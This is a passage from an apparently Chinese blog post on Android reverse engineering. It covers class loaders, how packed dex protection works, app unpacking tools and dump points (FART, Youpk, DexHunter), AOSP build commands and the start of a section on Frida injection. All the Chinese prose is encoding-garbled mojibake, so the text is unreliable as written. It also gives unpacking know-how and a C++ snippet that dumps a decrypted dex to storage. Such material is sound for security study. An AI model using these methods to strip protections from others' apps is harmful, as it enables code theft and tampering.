è½½ç³»ç»Ÿç±»ã€‚ä¸Javaä¸­çš„BootClassLoaderä¸åŒï¼Œå®ƒå¹¶ä¸æ˜¯ç”±C/C++ä»£ç å®ç°ï¼Œè€Œæ˜¯ç”±Javaå®ç°çš„ï¼›</p><p>BaseDexClassLoaderæ˜¯PathClassLoaderã€DexClassLoaderã€InMemoryDexClassLoaderçš„çˆ¶ç±»ï¼Œç±»åŠ è½½çš„</p><p>ä¸»è¦é€»è¾‘éƒ½æ˜¯åœ¨BaseDexClassLoaderå®Œæˆçš„ã€‚</p><p>SecureClassLoaderç»§æ‰¿äº†æŠ½è±¡ç±»ClassLoaderï¼Œæ‹“å±•äº†ClassLoaderç±»åŠ å…¥äº†æƒé™æ–¹é¢çš„åŠŸèƒ½ï¼ŒåŠ å¼ºäº†å®‰</p><p>å…¨æ€§ï¼Œå…¶å­ç±»URLClassLoaderæ˜¯ç”¨URLè·¯å¾„ä»jaræ–‡ä»¶ä¸­åŠ è½½ç±»å’Œèµ„æºã€‚</p><p>å…¶ä¸­<strong>é‡ç‚¹å…³æ³¨</strong>çš„æ˜¯<strong>PathClassLoader</strong>å’Œ<strong>DexClassLoader</strong>ã€‚</p><p>PathClassLoaderæ˜¯Androidé»˜è®¤ä½¿ç”¨çš„ç±»åŠ è½½å™¨ï¼Œä¸€ä¸ªapkä¸­çš„Activityç­‰ç±»ä¾¿æ˜¯åœ¨å…¶ä¸­åŠ è½½ã€‚</p><p>DexClassLoaderå¯ä»¥åŠ è½½ä»»æ„ç›®å½•ä¸‹çš„dex/jar/apk/zipæ–‡ä»¶ï¼Œæ¯”PathClassLoaderæ›´çµæ´»ï¼Œæ˜¯å®ç°æ’ä»¶</p><p>åŒ–ã€çƒ­ä¿®å¤ä»¥åŠdexåŠ å£³çš„é‡ç‚¹ã€‚</p><p>Android8.0æ–°å¼•å…¥InMemoryDexClassLoaderï¼Œä»åå­—ä¾¿å¯çœ‹å‡ºæ˜¯ç”¨äºç›´æ¥ä»å†…å­˜ä¸­åŠ è½½dex</p><h3 id="DexClassLoaderå‚æ•°ä»‹ç»">DexClassLoaderå‚æ•°ä»‹ç»</h3><p>æ¥ä¸‹æ¥ä½¿ç”¨DexClassLoaderç±»å®ç°ä¸€ä¸ªæœ€ç®€å•çš„åŠ¨æ€åŠ è½½æ’ä»¶dexï¼Œå¹¶éªŒè¯æ­¤æ—¶çš„ClassLoaderé—´çš„ç»§æ‰¿å…³ç³»ï¼›</p><p>DexClassLoaderæ–¹æ³•å‚æ•°ï¼š</p><p>dexPath:ç›®æ ‡æ‰€åœ¨çš„apkæˆ–è€…jaræ–‡ä»¶çš„è·¯å¾„ï¼Œè£…è½½å™¨å°†ä»è·¯å¾„ä¸­å¯»æ‰¾æŒ‡å®šçš„ç›®æ ‡ç±»ã€‚</p><p>dexOutputDir:ç”±äºdex æ–‡ä»¶åœ¨APKæˆ–è€… jaræ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥åœ¨è£…è½½å‰é¢å‰å…ˆè¦ä»é‡Œé¢è§£å‹å‡ºdexæ–‡ä»¶ï¼Œè¿™ä¸ªè·¯å¾„å°±æ˜¯dexæ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ï¼Œåœ¨androidç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªåº”ç”¨ç¨‹åºå¯¹åº”ä¸€ä¸ªlinuxç”¨æˆ·id ,åº”ç”¨ç¨‹åºåªå¯¹è‡ªå·±çš„æ•°æ®ç›®å½•æœ‰å†™çš„æƒé™ï¼Œæ‰€ä»¥æˆ‘ä»¬å­˜æ”¾åœ¨è¿™ä¸ªè·¯å¾„ä¸­ã€‚</p><p>libPath :ç›®æ ‡ç±»ä¸­ä½¿ç”¨çš„C/C++åº“ã€‚</p><p>æœ€åä¸€ä¸ªå‚æ•°æ˜¯è¯¥è£…è½½å™¨çš„çˆ¶è£…è½½å™¨ï¼Œä¸€èˆ¬ä¸ºå½“å‰æ‰§è¡Œç±»çš„è£…è½½å™¨ã€‚</p><p><strong>æºç åˆ†æAndroidä¸­çš„LoadClasså’Œ</strong></p><p>forNameçš„æµç¨‹å’ŒåŒºåˆ«</p><p>ä½¿ç”¨LoadClassï¼ˆï¼‰åŠ è½½</p><p>ä½¿ç”¨forNameï¼ˆï¼‰åŠ è½½<br><img src="/posts/e65d2ab6.htm/image-20240123232731529.png" alt="image-20240123232731529"></p><p>appè¿è¡Œæµç¨‹<br><img src="/posts/e65d2ab6.htm/image-20240123232814798.png" alt="image-20240123232814798"></p><p>1ã€ä½•æ—¶è¿›è¡Œdexçš„è§£å¯†ï¼Ÿ</p><p>2ã€å¦‚ä½•è§£å†³åŠ¨æ€åŠ è½½çš„dexä¸­çš„ç±»çš„ç”Ÿå‘½å‘¨æœŸé—®é¢˜<br><img src="/posts/e65d2ab6.htm/image-20240123232844631.png" alt="image-20240123232844631"></p><p>DexClassLoaderåŠ è½½çš„ç±»æ˜¯æ²¡æœ‰ç»„ä»¶ç”Ÿå‘½å‘¨æœŸçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å³ä½¿DexClassLoaderé€šè¿‡å¯¹APKçš„åŠ¨æ€åŠ è½½å®Œæˆäº†å¯¹ç»„ä»¶ç±»çš„åŠ è½½ï¼Œå½“ç³»ç»Ÿå¯åŠ¨è¯¥ç»„ä»¶æ—¶ï¼Œä¾ç„¶ä¼šå‡ºç°åŠ è½½ç±»å¤±è´¥çš„å¼‚å¸¸ã€‚ä¸ºä»€ä¹ˆç»„ä»¶ç±»è¢«åŠ¨æ€åŠ è½½å…¥è™šæ‹Ÿæœºï¼Œä½†ç³»ç»Ÿå´å‡ºç°åŠ è½½ç±»å¤±è´¥å‘¢ï¼Ÿ</p><p>ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š</p><p>1ã€æ›¿æ¢ç³»ç»Ÿç»„ä»¶ç±»åŠ è½½å™¨ä¸ºæˆ‘ä»¬çš„DexClassLoaderï¼ŒåŒæ—¶è®¾ç½®DexClassLoaderçš„parentä¸ºç³»ç»Ÿç»„ä»¶ç±»åŠ è½½å™¨ï¼›</p><p>2ã€æ‰“ç ´åŸæœ‰çš„åŒäº²å…³ç³»ï¼Œåœ¨ç³»ç»Ÿç»„ä»¶ç±»åŠ è½½å™¨å’ŒBootClassLoaderçš„ä¸­é—´æ’å…¥æˆ‘ä»¬è‡ªå·±çš„DexClassLoaderå³å¯ï¼›<br><img src="/posts/e65d2ab6.htm/image-20240123232947710.png" alt="image-20240123232947710"></p><p><img src="/posts/e65d2ab6.htm/image-20240123232959009.png" alt="image-20240123232959009"></p><h2 id="æŠ½å–åŠ å›º">æŠ½å–åŠ å›º</h2><h3 id="æœ¬è´¨">æœ¬è´¨</h3><p>æå–å‡ºdexä¸­æ–¹æ³•ä½“çš„å­—èŠ‚ç ï¼Œå¹¶åœ¨æ–¹æ³•è¿è¡Œæ—¶è¿˜åŸ</p><h3 id="å®ç°å½¢å¼">å®ç°å½¢å¼</h3><ul><li>æŠ½ç©ºæ–¹æ³•ä½“ä»£ç ï¼Œè¿è¡Œæ–¹æ³•åå›å¡«ï¼Œè¿è¡Œåä¸å†æŠ½å–â€“&gt;å»¶æ—¶ä¿å­˜</li><li>æŠ½ç©ºæ–¹æ³•ä½“ä»£ç ï¼Œè¿è¡Œæ–¹æ³•åå›å¡«ï¼Œè¿è¡Œå®ŒååˆæŠ½å–â€“&gt;FART,Youpkä¸»åŠ¨è°ƒç”¨</li><li>æŠ½ç©ºæ–¹æ³•ä½“ä»£ç ï¼Œå°†åŸæœ‰å‡½æ•°ä½“æ›¿æ¢ä¸ºè§£å¯†ä»£ç ï¼Œè¿è¡Œæ—¶è§£å¯†æ‰§è¡Œ</li></ul><h3 id="å¯¹åŸæœ‰dexå¤„ç†å½¢å¼">å¯¹åŸæœ‰dexå¤„ç†å½¢å¼</h3><p>1ï¼‰åŸæœ‰å‡½æ•°ä½“æ•°æ®ç©ºé—´ç½®0ï¼Œä¿ç•™åŸæœ‰ç©ºé—´</p><p>2ï¼‰å¯¹dexé‡æ„ï¼Œä¸ä¿ç•™åŸç©ºé—´ï¼Œåœ¨è¿˜åŸæ•°æ®æ—¶ä¿®æ”¹CodeltemOffset</p><h3 id="è§£å†³æ€è·¯">è§£å†³æ€è·¯</h3><ul><li>åœ¨å‡½æ•°è¿è¡Œæ—¶ä¿å­˜è¢«æŠ½å–çš„æ•°æ®</li></ul><h4 id="è¢«åŠ¨è°ƒç”¨">è¢«åŠ¨è°ƒç”¨</h4><p>appæ­£å¸¸è¿è¡Œè¿‡ç¨‹ä¸­æ‰€å‘ç”Ÿçš„å‡½æ•°è°ƒç”¨åªå¯¹dexä¸­éƒ¨åˆ†ç±»å®ŒæˆåŠ è½½ï¼Œåªå¯¹dexä¸­éƒ¨åˆ†å‡½æ•°å®Œæˆè°ƒç”¨ï¼Œè°ƒç”¨å‡½æ•°ä¸å…¨ï¼Œå¯¼è‡´èƒ½å¤Ÿæ¢å¤å‡½æ•°æœ‰é™</p><h4 id="ä¸»åŠ¨è°ƒç”¨">ä¸»åŠ¨è°ƒç”¨</h4><p>æ„é€ è™šæ‹Ÿè°ƒç”¨ï¼Œå¯¹æ‰€æœ‰å‡½æ•°å®Œæˆè°ƒç”¨ï¼Œåœ¨è¿™äº›å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¿å­˜æ•°æ®ä½“Codeltemæ•°æ®ï¼Œä¿å­˜æ•°æ®æ—¶æœºè¶Šæ™šæ•ˆæœè¶Šå¥½</p><p>å¸¸è§æŠ½å–åŠ å›ºè„±å£³ç³»ç»Ÿ</p><ul><li>DexHunter(è¢«åŠ¨è°ƒç”¨)</li><li>Fupk3(Dalvik)</li><li>FART</li><li>Youpk</li></ul><h2 id="å…¶ä»–åŠ å›ºå½¢å¼">å…¶ä»–åŠ å›ºå½¢å¼</h2><h3 id="VMP">VMP</h3><p><a href="https://github.com/chago/ADVMP">https://github.com/chago/ADVMP</a></p><p>VMPä¿æŠ¤ä¸€èˆ¬é’ˆå¯¹éƒ¨åˆ†å‡½æ•°ï¼Œè¿™äº›å‡½æ•°ä¼šè¢«nativeåŒ–ï¼Œå®šä½è§£é‡Šå™¨æ˜¯å…³é”®ï¼Œæ‰¾åˆ°æ˜ å°„å…³ç³»ä¾¿å¯æ¢å¤ã€‚vmpé€šå¸¸å…±ç”¨ä¸€ä¸ªè§£é‡Šå™¨ã€‚è¢«VMPä¿æŠ¤çš„å‡½æ•°é€šå¸¸ä¼šæ³¨å†Œåˆ°åŒä¸€ä¸ªåœ°å€ä¸Šï¼Œæˆ–è€…å‡½æ•°é€»è¾‘ç›¸ä¼¼</p><h3 id="dex2c">dex2c</h3><p><a href="https://github.com/amimo/dcc">https://github.com/amimo/dcc</a>  æ”¯æŒå®šåˆ¶</p><p>é€šè¿‡æ­¤æ³•åˆ†æï¼Œè¯­æ³•åˆ†æç­‰ï¼Œè¿›è¡ŒJavaåˆ°Cçš„ç­‰ä»·è½¬åŒ–ï¼Œå½»åº•è¿˜åŸéš¾åº¦å¤§ï¼Œä¼šæœ‰å¤§é‡çš„jniç›¸å…³çš„APIè°ƒç”¨</p><p>dex2Cé€šå¸¸æ³¨å†Œåœ¨ä¸åŒçš„åœ°å€ä¸Šï¼Œå¹¶ä¸”å‡½æ•°é€»è¾‘ä¸ç›¸ä¼¼ã€‚</p><h2 id="è„±å£³çš„ä¸€äº›å¸¸ç”¨æ–¹æ³•">è„±å£³çš„ä¸€äº›å¸¸ç”¨æ–¹æ³•</h2><p>å¯¹äºæ•´ä½“åŠ å›ºï¼š</p><p>1ï¼‰è„±å£³å·¥å…·fdex2ï¼š</p><p>é€šè¿‡Classç±»çš„getDexæ–¹æ³•è·å¾—DexFileï¼Œå†é€šè¿‡DexFileçš„getBytesæ–¹æ³•å¾—åˆ°dexæ–‡ä»¶ï¼Œå®‰å“7.1ä»¥ä¸‹ä½¿ç”¨ï¼Œ8.0ä¹‹åæ²¡æœ‰getDexå’ŒgetBytesæ–¹æ³•äº†ã€‚</p><p>2ï¼‰è„±å£³å·¥å…·blackdex</p><p>é€šè¿‡mCookieæ¥è„±å£³</p><p>3ï¼‰è„±å£³å·¥å…·Frid-dexdump</p><p>å†…å­˜ä¸­æœç´¢dexæ–‡ä»¶ä¿å­˜ä¸‹æ¥</p><p>4ï¼‰è„±å£³ç³»ç»ŸFart,Youpk</p><p>dexåŠ è½½ï¼Œæ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæ‰¾ä¸€ä¸ªåˆé€‚çš„æ—¶æœºå¾—åˆ°DexFileå†…å­˜åœ°å€å’Œå¤§å°ï¼Œå°†è§£å¯†çš„dexä¿å­˜ä¸‹æ¥</p><p>è¿˜å¯ä»¥é€šè¿‡artMethodæ¥å¾—åˆ°DexFile</p><p>5ï¼‰æ‰¾åˆ°ç›¸åº”è„±å£³ç‚¹ï¼Œè¿›è¡Œdump</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DexFile OpenCommon</span></span><br><span class="line"><span class="type">int</span> pid = <span class="built_in">getpid</span>();</span><br><span class="line"><span class="type">char</span> dexfilepath[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">sprintf</span>(dexfilepath,<span class="string">&quot;/sdcard/%d_%d è„±å£³ç‚¹å‡½æ•°å.dex&quot;</span>,length,pid);</span><br><span class="line"><span class="type">int</span> fd=<span class="built_in">open</span>(dexfilepath,<span class="number">0</span> CREAT|<span class="number">0</span> RDWR,<span class="number">666</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="type">int</span> number=<span class="built_in">write</span>(fd,addr,length);</span><br><span class="line">    <span class="keyword">if</span>(number&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>6ï¼‰dexhunter</p><p>éå†dexå½“ä¸­æ‰€æœ‰çš„ç±»ï¼Œç„¶åä¸»åŠ¨è¿›è¡ŒåŠ è½½å’Œåˆå§‹åŒ–</p><p>fupk3åŸºäºDalvik Android4.4</p><h2 id="ARTä¸‹çš„è„±å£³ç‚¹">ARTä¸‹çš„è„±å£³ç‚¹</h2><p>æŠ½å–åŠ å›ºé¦–å…ˆå¹²æ‰dex2oatï¼Œæˆ–è€…å¡«å……æ—¶æœºåœ¨oatä¹‹å‰</p><p>1ï¼‰dexçš„åŠ è½½æµç¨‹  ï¼ˆæ•´ä½“åŠ å›ºï¼‰</p><ul><li>é€šè¿‡mCookieè„±å£³    mCookieæ˜¯jlongarrayæ•°ç»„ å­˜æ”¾DexFileå¯¹è±¡æŒ‡é’ˆ</li><li>é€šè¿‡openCommenå‡½æ•°è„±å£³</li><li>é€šè¿‡DexFileæ„é€ å‡½æ•°è„±å£³</li><li>youpkï¼šé€šè¿‡ClassLinkeræ¥å¾—åˆ°DexFile</li></ul><p>2ï¼‰dex2oatçš„ç¼–è¯‘æµç¨‹==ã€‹æŠŠdexæ–‡ä»¶å˜ä¸ºoatæ–‡ä»¶ ï¼ˆæ•´ä½“åŠ å›ºï¼‰</p><ul><li>é€šè¿‡ä¿®æ”¹dex2oatè„±å£³çš„     å®‰å“10çš„åº”ç”¨ä¸é€‚ç”¨ï¼Œä½†æ˜¯ç³»ç»Ÿåº”ç”¨ä»ä½¿ç”¨dex2oat</li></ul><p>3ï¼‰ç±»çš„åŠ è½½å’Œåˆå§‹åŒ–æµç¨‹  ï¼ˆæŠ½å–åŠ å›ºï¼‰</p><ul><li>DexHunteråœ¨defineClassè¿›è¡Œç±»è§£æ  ï¼ˆåŸºäºè¢«åŠ¨è°ƒç”¨ï¼‰</li><li>LoadMethodã€LinkCode</li></ul><p>4ï¼‰åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­è„±å£³</p><ul><li>FARTï¼šExecuteæ•´ä½“è„±å£³ ï¼ˆæ•´ä½“è„±å£³ç‚¹ï¼‰</li><li>FARTï¼šArtMethod::invokeå‡½æ•°ä¸­è¿›è¡Œdump Codeltem  ï¼ˆæŠ½å–è„±å£³ç‚¹ï¼‰</li><li>youpkï¼šç›´æ¥åˆ°äº†è§£é‡Šæ‰§è¡Œçš„å‡½æ•°ä¸­è¿›è¡Œdump Codeltem</li></ul><h1>Androidç³»ç»Ÿç¼–è¯‘</h1><p>å®‰å“ç³»ç»Ÿç¼–è¯‘å‰ç½®çŸ¥è¯†</p><ul><li>aospæºç ï¼Œå¯¹åº”çš„Linuxå†…æ ¸ï¼Œå¯¹åº”çš„æ‰‹æœºé©±åŠ¨ã€‚å¯¹åº”æ˜¯æŒ‡è¦è·Ÿaospç³»ç»Ÿç‰ˆæœ¬å¯¹åº”ï¼Œè¦ä¸æ‰‹æœºå‹å·å¯¹åº”</li></ul><h2 id="æºç ä¸‹è½½">æºç ä¸‹è½½</h2><p>ç½‘å€ï¼š<a href="https://mirrors.ustc.edu.cn/help/aosp.html">AOSP é•œåƒä½¿ç”¨å¸®åŠ© â€” USTC Mirror Help æ–‡æ¡£</a></p><p>â€‹           <a href="https://mirrors.tuna.tsinghua.edu.cn/help/AOSP/">AOSP | é•œåƒç«™ä½¿ç”¨å¸®åŠ© | æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ | Tsinghua Open Source Mirror</a></p><h2 id="ä¸‹è½½åˆå§‹åŒ–åŒ…å¹¶è§£å‹">ä¸‹è½½åˆå§‹åŒ–åŒ…å¹¶è§£å‹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> ~/bin</span><br><span class="line"><span class="built_in">cd</span> ~/bin</span><br><span class="line">wget https://mirrors.ustc.edu.cn/aosp-monthly/aosp-latest.tar</span><br><span class="line">ï¼ˆå¯ä»¥ä½¿ç”¨wget -c æ”¯æŒæ–­ç‚¹ä¸‹è½½ï¼‰</span><br><span class="line"><span class="built_in">md5sum</span> aosp-latest.tar (æ ¡éªŒæ˜¯å¦ä¸‹è½½å®Œæ•´)</span><br><span class="line">tar xvf aosp-latest.tar</span><br></pre></td></tr></table></figure><h2 id="åŒæ­¥æŒ‡å®šç‰ˆæœ¬æºç ">åŒæ­¥æŒ‡å®šç‰ˆæœ¬æºç </h2><p>è§£å‹å®ŒtaråŒ…åæ‰“ä¸ªå¿«ç…§ï¼Œå› ä¸ºåªèƒ½ç¼–è¯‘ä¸€ä¸ªæŒ‡å®šç‰ˆæœ¬çš„æºç ã€‚ç¼–è¯‘å¤šä¸ªä¼šå‡ºé”™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">è§£å‹å®Œè¿›å…¥aospç›®å½•</span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"><span class="built_in">sudo</span> apt-get install git</span><br><span class="line">git config --global user.email 644129939@qq.com</span><br><span class="line">git config --global user.name <span class="string">&quot;zxk1ng&quot;</span></span><br><span class="line"></span><br><span class="line">//ä¸‹è½½repo</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PATH=~/bin:\$PATH&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br><span class="line"><span class="built_in">sudo</span> apt-get install curl</span><br><span class="line">curl -sSL <span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo/+/master/repo?             format=TEXT&#x27;</span> |<span class="built_in">base64</span> -d &gt;~/bin/repo</span><br><span class="line"><span class="built_in">chmod</span> a+x ~/bin/repo</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">export</span> REPO_URL=<span class="string">&#x27;https://gerrit-googlesource.proxy.ustclug.org/git-repo&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> aosp</span><br><span class="line"></span><br><span class="line">//åŒæ­¥æŒ‡å®šç‰ˆæœ¬æºç </span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/</span><br><span class="line">repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r17</span><br><span class="line"></span><br><span class="line">repo <span class="built_in">sync</span></span><br><span class="line">/*</span><br><span class="line">å½“repo <span class="built_in">sync</span>æŠ¥é”™ï¼š</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp/.repo/repo</span><br><span class="line">git pull</span><br><span class="line"><span class="built_in">cd</span> ~/bin/aosp</span><br><span class="line">å†æ¬¡repo initã€repo <span class="built_in">sync</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">//ä»£ç å’Œç»†åˆ†ç‰ˆæœ¬å·å¯æŸ¥çœ‹ä¸‹é¢é“¾æ¥ é€‰æœ‰é©±åŠ¨æ”¯æŒæ‰‹æœºå¤šçš„ï¼Œå¿«ç…§</span><br><span class="line">(https://source.android.com/docs/setup/about/build-numbers?hl=zh-cn)</span><br></pre></td></tr></table></figure><h2 id="è·å–æ‰‹æœºé©±åŠ¨">è·å–æ‰‹æœºé©±åŠ¨</h2><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//å®‰è£…jdk8</span><br><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:openjdk-r/ppa</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-8-jdk</span><br></pre></td></tr></table></figure><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å®‰è£…æ‰€éœ€è¦çš„ä¾èµ–ï¼ˆubuntu20.04ï¼‰</span></span><br><span class="line">sudo apt-<span class="built_in">get</span> install git-core gnupg flex bison build-essential zip curl zlib1g-<span class="built_in">dev</span> gcc-multilib g++-multilib libc6-<span class="built_in">dev</span>-i386 lib32ncurses5-<span class="built_in">dev</span> x11proto-core-<span class="built_in">dev</span> libx11-<span class="built_in">dev</span> lib32z1-<span class="built_in">dev</span> libgl1-mesa-<span class="built_in">dev</span> libxml2-utils xsltproc unzip fontconfig libncurses5</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è®¾å¤‡é©±åŠ¨å‡†å¤‡</p><p><a href="https://developers.google.com/android/drivers">https://developers.google.com/android/drivers</a></p><p>ä¸‹è½½å’Œä½ å¯¼å‡ºçš„æºç ç‰ˆæœ¬åŒ¹é…çš„é©±åŠ¨ï¼Œä¾‹å¦‚<img src="/posts/e65d2ab6.htm/image-20240129152507615.png" alt="image-20240129152507615"></p><p>ä¸‹è½½çš„æ˜¯Android 10.0.0_r17ï¼Œæ‰€ä»¥ä¸‹è½½ä¸Šé¢ä¸¤ä¸ªé©±åŠ¨</p><p>ä¸‹è½½-&gt;æ”¾åˆ°linuxä¸­çš„aospç›®å½•ä¸­è§£å‹ï¼Œè¿è¡Œè§£å‹å‡ºæ¥çš„ä¸¤ä¸ª.shæ–‡ä»¶</p><h2 id="æºç ç¼–è¯‘">æºç ç¼–è¯‘</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//aospç›®å½•ä¸‹</span><br><span class="line">make clobber (å¦‚æœåŒä¸€æºç ç¼–è¯‘ä¸åŒæœºå‹è¾“å…¥è¿™ä¸ªå‘½ä»¤)</span><br><span class="line"><span class="built_in">source</span> build/envsetup.sh å¯¼å‡ºç¯å¢ƒå˜é‡</span><br><span class="line">lunch<span class="comment"># é€‰æ‹©è®¾å¤‡å†…æ ¸å’Œç¼–è¯‘ç‰ˆæœ¬  eng/user/usrdebug</span></span><br><span class="line"><span class="comment"># å¢åŠ ç¼–è¯‘äº§å“é€‰é¡¹ ä¿®æ”¹aosp/device/google/marlin/AndroidProducts.mk(ç…§çŒ«ç”»è™)</span></span><br><span class="line">é€‰æ‹©è¦ç¼–è¯‘çš„è®¾å¤‡å†…æ ¸</span><br><span class="line">make -j8 <span class="comment">#ç¼–è¯‘</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘è¡¥å……">ç¼–è¯‘è¡¥å……</h2><ul><li><p>ç¼–è¯‘æŠ¥é”™æˆ–è€…ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶åï¼Œéƒ½å¯ä»¥ç›´æ¥makeï¼Œå·²ç»ç¼–è¯‘çš„éƒ¨åˆ†ä¼šè·³è¿‡</p></li><li><p>make clean ä¼šæ¸…é™¤å·²ç»ç¼–è¯‘çš„ï¼Œé‡æ–°å†æ¥ï¼Œåœ¨ç¼–è¯‘ä¸åŒlunché€‰é¡¹æ—¶ä½¿ç”¨</p></li><li><p>å•ç‹¬ç¼–è¯‘system.img åœ¨æ ¹ç›®å½•åœ¨<br>source build/envsetup.sh</p><p>lunch xxx<br>make systemimage -j4</p></li><li><p>å•ç‹¬ç¼–è¯‘æŸä¸ªæ¨¡å— mmm packages/apps/zxk1ng<br>å°†å•ç‹¬ç¼–è¯‘çš„æ¨¡å—æ‰“åŒ…åˆ°imgé•œåƒä¸­ make snod</p></li></ul><h2 id="å¯¼å…¥aospåˆ°AndroidStudio">å¯¼å…¥aospåˆ°AndroidStudio</h2><p>ç¼–è¯‘æˆåŠŸä¸€ç¨‹androidæºç å</p><p>1ï¼‰åœ¨aospç›®å½•ä¸‹æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">mmm development/tools/idegen/</span><br><span class="line">development/tools/idegen/idegen.sh</span><br></pre></td></tr></table></figure><p>2ï¼‰ä¸‹è½½Android-Studio: wget+ç½‘å€</p><p>3ï¼‰è®¾ç½®ä¸­,Appearance-&gt;System Settings-&gt;Memory Settings ä¿®æ”¹å†…å­˜ä¸º4096</p><p>4ï¼‰è®¾ç½®ä¸­ï¼šAndroid SDK ä¸‹è½½å®‰å“10 APIï¼ŒNDKï¼ŒCmake</p><p>5ï¼‰å¯¼å…¥å®‰å“10æºç æ–‡ä»¶Android.ipr</p><h1>FridaæŒä¹…åŒ–</h1><h2 id="Hookå‰æ">Hookå‰æ</h2><p>éœ€è¦å°†ä»£ç æˆ–è€…èƒ½å¤Ÿå®ŒæˆHookåŠŸèƒ½çš„ä¸œè¥¿ï¼Œæ³¨å…¥åˆ°ç›®æ ‡è¿›ç¨‹</p><p>æ³¨å…¥æ–¹å¼ï¼š</p><ul><li>zygoteæ³¨å…¥ï¼šxposedä½¿ç”¨è¿™ä¸ªæ³¨å…¥æ–¹å¼ï¼ŒxposedBridge.jarä¼šæ³¨å…¥åˆ°forkå‡ºæ¥çš„æ‰€æœ‰è¿›ç¨‹</li><li>ptraceæ³¨å…¥ï¼šéœ€è¦rootæƒé™,åˆ©ç”¨å®‰å“ç³»ç»ŸåŠŸèƒ½æ–‡ä»¶æ³¨å…¥ç›¸åº”è¿›ç¨‹ï¼ˆfrida-serverï¼‰</li><li>æ–‡ä»¶æ„ŸæŸ“ï¼šå½“åŠ è½½ä¸€ä¸ªsoæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šå…ˆå»åŠ è½½ä¾èµ–çš„.soæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¾èµ–è®©å…¶åŠ è½½å…¶ä»–çš„soæ–‡ä»¶</li></ul><h2 id="frida-gadget">frida-gadget</h2><p>å½“Hookä»£ç ä¿®æ”¹æ£€æµ‹å®Œæ¯•ï¼Œå¯ä»¥é€šè¿‡å®ƒæ¥å®ç°å…rootï¼Œè„±ç¦»PCï¼Œä½†æ˜¯å®ƒæœ¬èº«æ²¡æœ‰æ³¨å…¥åŠŸèƒ½ï¼Œéœ€è¦å°†å…¶æ‰“åŒ…åˆ°appä¸­ã€‚</p><p><a href="http://xn--libfrida-gadget-n214a.so">æŠŠlibfrida-gadget.so</a>(å®˜ç½‘ä¸‹è½½)æ–‡ä»¶æ”¾å…¥libæ–‡ä»¶ä¸‹çš„æŸä¸ªarmæ–‡ä»¶å¤¹ä¸­ï¼Œåœ¨å‡†å¤‡ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œ<a 